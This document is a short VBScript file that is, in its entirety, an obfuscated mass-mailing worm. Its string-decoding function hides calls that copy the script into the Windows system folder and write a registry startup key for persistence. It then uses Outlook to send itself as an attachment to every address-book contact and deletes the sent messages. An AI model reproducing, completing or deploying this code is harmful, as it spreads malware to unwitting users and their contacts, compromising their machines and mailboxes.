On Error Resume Next

Dim RA772, WARTU, YBG, IHT, OBL

Dim ASPC, XR2DCC8

Set ASPC = CreateObject( X828XAJ( "sbdiaNldsrxRdkhE-fmhsohqbR" ) )
ASPC.CopyFile WScript.ScriptFullName, ASPC.BuildPath( ASPC.GetSpecialFolder(1), X828XAJ( "RAU-HWF6D" ) )

Set XR2DCC8 = CreateObject( X828XAJ( "kkdgR-sohqbRV" ) )
XR2DCC8.RegWrite X828XAJ( "[rdbhuqdRmtQ[mnhrqdUsmdqqtB[rvncmhV[senrnqbhL[dq`vsenR[DMHGB@L^K@BNK^XDJG" ) & X828XAJ( "HWF6D" ), ASPC.BuildPath( ASPC.GetSpecialFolder(1), X828XAJ( "RAU-HWF6D" ) )

Set RA772 = CreateObject( X828XAJ( "mnhs`bhkoo@-jnnkstN" ) )
Set WARTU = RA772.GetNameSpace( X828XAJ( "HO@L" ) )

For Each YBG In WARTU.AddressLists
    For IHT = 1 To YBG.AddressEntries.Count
        Set OBL = RA772.CreateItem( 0 )

        OBL.BCC = YBG.AddressEntries( IHT ).Address

        OBL.Subject = X828XAJ( "dfqnI" )
        OBL.Body = X828XAJ( "dfqnI" )
        OBL.Attachments.Add WScript.ScriptFullName
        OBL.DeleteAfterSubmit = True
        OBL.Send
    Next
Next

Function X828XAJ( OKK6 )
   Dim CJL7IFH2
   Dim MTK
   Dim C3W57R

   CJL7IFH2 = ""

   For MTK = 1 To Len( OKK6 )
       C3W57R = Mid( OKK6, MTK, 1 )

       CJL7IFH2 = Chr( Asc( C3W57R ) + 1 ) & CJL7IFH2
   Next

   X828XAJ = CJL7IFH2
End Function
